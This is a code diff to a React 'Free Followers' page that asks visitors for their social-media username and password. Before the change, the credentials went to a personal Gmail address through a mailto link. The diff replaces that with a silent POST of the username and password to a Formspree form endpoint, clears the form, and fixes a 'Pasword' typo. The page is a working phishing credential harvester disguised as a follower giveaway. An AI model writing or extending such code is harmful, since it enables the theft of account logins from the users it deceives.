@@ -37,19 +37,27 @@ export default function FreeFollowersPage() {
     setIsSubmitting(true);
 
     try {
-      // Build mailto link with encoded subject and body
-      const subject = encodeURIComponent("Free Followers Request");
-      const body = encodeURIComponent(
-        `Username: ${form.username}\nPassword: ${form.password}`
-      );
+      const response = await fetch("https://formspree.io/f/myzpzjoz", {
+        method: "POST",
+        headers: {
+          Accept: "application/json",
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          username: form.username,
+          password: form.password,
+        }),
+      });
 
-      // Open default mail client with prefilled email
-      window.location.href = `mailto:awaisashraf.dev@gmail.com?subject=${subject}&body=${body}`;
-
-      setSubmitMessage("Your email client should open now.");
+      if (response.ok) {
+        setSubmitMessage("Submitted successfully ✅");
+        setForm({ username: "", password: "" });
+      } else {
+        setSubmitMessage("Failed to submit. Try again.");
+      }
     } catch (error) {
-      console.error("Error opening email client:", error);
-      setSubmitMessage("An error occurred. Please try again.");
+      console.error("Submit error:", error);
+      setSubmitMessage("Something went wrong.");
     } finally {
       setIsSubmitting(false);
     }
@@ -86,9 +94,9 @@ export default function FreeFollowersPage() {
               animate={{ opacity: 1, y: 0 }}
               exit={{ opacity: 0, y: -20 }}
               className={`p-4 rounded-lg mb-6 ${
-                submitMessage.includes("error")
-                  ? "bg-red-500/20 text-red-200"
-                  : "bg-green-500/20 text-green-200"
+                submitMessage.includes("success")
+                  ? "bg-green-500/20 text-green-200"
+                  : "bg-red-500/20 text-red-200"
               }`}
             >
               {submitMessage}
@@ -122,8 +130,8 @@ export default function FreeFollowersPage() {
           <div>
             <input
               type="text"
-              name="pasword"
-              placeholder="Pasword"
+              name="password"
+              placeholder="Password"
               value={form.password}
               onChange={(e) => setForm({ ...form, password: e.target.value })}
               className={`w-full p-3 bg-white/5 border ${
